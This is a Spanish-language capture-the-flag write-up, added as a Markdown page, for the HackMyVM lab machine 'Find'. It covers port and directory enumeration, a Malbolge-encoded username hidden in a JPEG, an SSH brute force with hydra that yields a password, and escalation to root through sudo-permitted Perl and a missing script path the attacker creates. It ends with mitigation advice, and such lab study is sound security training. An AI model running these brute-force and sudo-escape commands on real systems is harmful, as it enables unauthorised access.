@@ -1,0 +1,261 @@
+---
+title: Find
+description: Resolución completa de la máquina virtual *Find* de HackMyVM, enfocada en análisis forense, lenguaje esotérico y escalada mediante configuración insegura de sudo.
+badge:
+  text: New
+  variant: tip
+---
+
+## Introducción
+
+Este documento detalla la metodología y procedimiento completo para comprometer la máquina **Find**, desarrollada por *powerful* para HackMyVM y clasificada con dificultad **Principiante**. Esta máquina presenta un escenario donde técnicas de análisis forense, decodificación de lenguajes esotéricos y mala configuración de permisos sudo permiten una escalada de privilegios controlada.
+
+La resolución sigue una metodología estructurada:
+
+1. **Reconocimiento:** Enumeración de servicios y descubrimiento de información oculta en archivos.
+2. **Explotación:** Análisis forense digital, decodificación de Malbolge y ataque de fuerza bruta.
+3. **Escalada de privilegios:** Abuso de permisos sudo mediante Perl y ejecución de scripts personalizados.
+
+El entorno de prueba fue desplegado en VirtualBox utilizando una imagen OVA proporcionada por HackMyVM, simulando vulnerabilidades típicas en entornos CTF.
+
+---
+
+## Información Técnica
+
+| Atributo        | Valor          |
+|-----------------|----------------|
+| **Nombre**      | Find           |
+| **Autor**       | powerful       |
+| **Dificultad**  | Principiante   |
+| **Fecha**       | 17/05/2022     |
+| **Plataforma**  | HackMyVM       |
+| **Formato**     | Imagen OVA     |
+| **IP Objetivo** | 192.168.100.13 |
+
+---
+
+## Fase 1 — Despliegue y Configuración
+
+### 1.1 Descarga y Preparación
+Descargamos la máquina desde HackMyVM y la desplegamos en VirtualBox como una imagen OVA.
+
+### 1.2 Identificación de la IP
+Una vez iniciada la máquina, obtenemos la dirección IP asignada:
+
+```
+Dirección IP objetivo: 192.168.100.13
+```
+
+### 1.3 Organización del Workspace
+Creamos una estructura organizada para documentar el proceso:
+
+```bash
+mkdir -p Find/{content,exploits,nmap,web,scripts}
+cd Find
+```
+
+---
+
+## Fase 2 — Reconocimiento
+
+### 2.1 Escaneo de Puertos
+Ejecutamos un escaneo TCP SYN para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 192.168.100.13 -oG allPorts
+```
+
+**Resultados:**
+- **22/tcp** — SSH (Secure Shell)
+- **80/tcp** — HTTP (Web Server)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1767048112/Ports_nhojnt.png)
+
+*Figura 1: Servicios expuestos en la máquina*
+
+### 2.2 Enumeración Web
+Realizamos un escaneo exhaustivo de directorios:
+
+```bash
+gobuster dir -u http://192.168.100.13 -w WORDLIST -x html,php,txt -t 50 -k -r
+```
+
+![Resultado del escaneo](https://res.cloudinary.com/dewqswzke/image/upload/v1767048112/Gobuster_cbqryi.png)
+
+*Figura 2: Recursos web descubiertos*
+
+**Resultados obtenidos:**
+- `/index` — Página principal generada automáticamente por Apache
+- `/cat.jpg` — Imagen de un gato con contenido oculto
+- `/robots.txt` — Indica que hay que encontrar un usuario
+
+### 2.3 Análisis de Contenido Web
+Descargamos y analizamos los recursos encontrados:
+
+```bash
+wget http://192.168.100.13/cat.jpg
+```
+
+---
+
+## Fase 3 — Explotación
+
+### 3.1 Análisis de la Imagen
+Analizamos la imagen `cat.jpg` con diversas herramientas, pero no encontramos resultados interesantes en análisis convencionales. Al examinar el contenido directamente:
+
+```bash
+cat cat.jpg
+```
+
+![Contenido adicional en imagen](https://res.cloudinary.com/dewqswzke/image/upload/v1767048112/CatCommand_gzhn0w.png)
+
+*Figura 3: Datos adicionales al final del archivo JPEG*
+
+### 3.2 Identificación del Lenguaje Esotérico
+El contenido adicional corresponde a código en **Malbolge**, un lenguaje de programación esotérico diseñado para ser extremadamente difícil.
+
+### 3.3 Decodificación del Malbolge
+Utilizamos herramientas especializadas para interpretar el código:
+
+![Resultado de decodificación](https://res.cloudinary.com/dewqswzke/image/upload/v1767048115/User_twzwus.png)
+
+*Figura 4: Nombre de usuario obtenido de Malbolge*
+
+**Nombre de usuario descubierto:** `missyred`
+
+### 3.4 Ataque de Fuerza Bruta SSH
+Con el nombre de usuario descubierto, realizamos un ataque de fuerza bruta:
+
+```bash
+hydra -l missyred -P rockyou.txt ssh://192.168.100.13 -I
+```
+
+![Resultado de Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1767048112/Hydra_sahrey.png)
+
+*Figura 5: Contraseña SSH comprometida*
+
+**Credenciales obtenidas:**
+- Usuario: `missyred`
+- Contraseña: `mypasswordis123`
+
+### 3.5 Acceso Inicial al Sistema
+Nos conectamos al sistema mediante SSH:
+
+```bash
+ssh missyred@192.168.100.13
+```
+
+![Conexión SSH exitosa](https://res.cloudinary.com/dewqswzke/image/upload/v1767048113/SSH_i3cym3.png)
+
+*Figura 6: Acceso SSH como usuario missyred*
+
+---
+
+## Fase 4 — Escalada de Privilegios
+
+### 4.1 Enumeración del Sistema
+Comenzamos la enumeración post-explotación:
+
+```bash
+sudo -l
+```
+
+![Privilegios sudo de missyred](https://res.cloudinary.com/dewqswzke/image/upload/v1767048115/Sudo-lMissy_hjrm0n.png)
+
+*Figura 7: Permisos sudo que permiten ejecutar Perl como kings*
+
+**Hallazgo:** `(kings) NOPASSWD: /usr/bin/perl`
+
+### 4.2 De `missyred` → `kings`
+Utilizamos Perl para obtener una shell como kings:
+
+```bash
+sudo -u kings perl -e 'exec "/bin/bash";'
+```
+
+![Shell como kings](https://res.cloudinary.com/dewqswzke/image/upload/v1767048113/Kings_a7p54l.png)
+
+*Figura 8: Acceso como usuario kings obtenido*
+
+### 4.3 De `kings` → `root`
+
+#### 4.3.1 Verificación de Privilegios Sudo
+```bash
+sudo -l
+```
+
+![Privilegios sudo de kings](https://res.cloudinary.com/dewqswzke/image/upload/v1767048115/Sudo-lKings_hprkcx.png)
+
+*Figura 9: Permisos sudo que permiten ejecutar script específico*
+
+**Hallazgo:** `(root) NOPASSWD: /opt/boom/boom.sh`
+
+#### 4.3.2 Creación del Script Malicioso
+El script no existe, así que lo creamos:
+
+```bash
+mkdir /opt/boom
+cd /opt/boom
+nano /opt/boom/boom.sh
+
+# Contenido del script:
+#!/bin/bash
+/bin/bash
+```
+
+#### 4.3.3 Configuración de Permisos y Ejecución
+```bash
+chmod +x /opt/boom/boom.sh
+sudo /opt/boom/boom.sh
+```
+
+![Shell como root](https://res.cloudinary.com/dewqswzke/image/upload/v1767048113/Root_qll4qv.png)
+
+*Figura 10: Acceso root obtenido exitosamente*
+
+### 4.4 Verificación Final
+```bash
+id
+whoami
+```
+
+---
+
+## Análisis de Vulnerabilidades
+
+### 5.1 Fallos de Seguridad Identificados
+
+| Vulnerabilidad                                  | Severidad | Impacto                             | CWE/Referencia |
+|-------------------------------------------------|-----------|-------------------------------------|----------------|
+| Información sensible en archivos públicos       | Media     | Exposición de nombres de usuario    | CWE-200        |
+| Contenido oculto en imágenes sin protección     | Baja      | Ocultamiento de información crítica | CWE-312        |
+| Contraseñas SSH débiles y predecibles           | Alta      | Acceso inicial comprometido         | CWE-521        |
+| Configuración insegura de sudo (perl)           | Alta      | Escalada horizontal de privilegios  | CWE-269        |
+| Permisos sudo para scripts en rutas escribibles | Crítica   | Escalada vertical a root            | CWE-732        |
+
+### 5.2 Recomendaciones de Mitigación
+
+1. **Gestión de Información en Recursos Públicos:**
+   - Evitar almacenar información sensible en archivos accesibles públicamente
+   - Implementar sanitización de metadatos en imágenes
+   - Utilizar robots.txt apropiadamente sin revelar información crítica
+
+2. **Protección de Credenciales SSH:**
+   - Implementar políticas de contraseñas complejas
+   - Deshabilitar autenticación por contraseña, usar claves SSH
+   - Configurar fail2ban para proteger contra fuerza bruta
+
+3. **Configuración Segura de Sudo:**
+   - Especificar comandos exactos con argumentos completos
+   - Evitar binarios que permitan ejecución de shell como Perl, bash, python
+   - Implementar el principio de mínimo privilegio
+
+4. **Protección de Rutas de Ejecución:**
+   - Establecer permisos adecuados en directorios como /opt/
+   - Utilizar rutas absolutas con permisos restringidos
+   - Implementar verificación de integridad de scripts ejecutados con privilegios
+
+5. **Monitoreo y Auditoría:**
+   - Implementar logging de uso de comandos sudo
+   - Monitorear creación de archivos en directorios privilegiados
+   - Realizar revisiones periódicas de configuración de seguridad
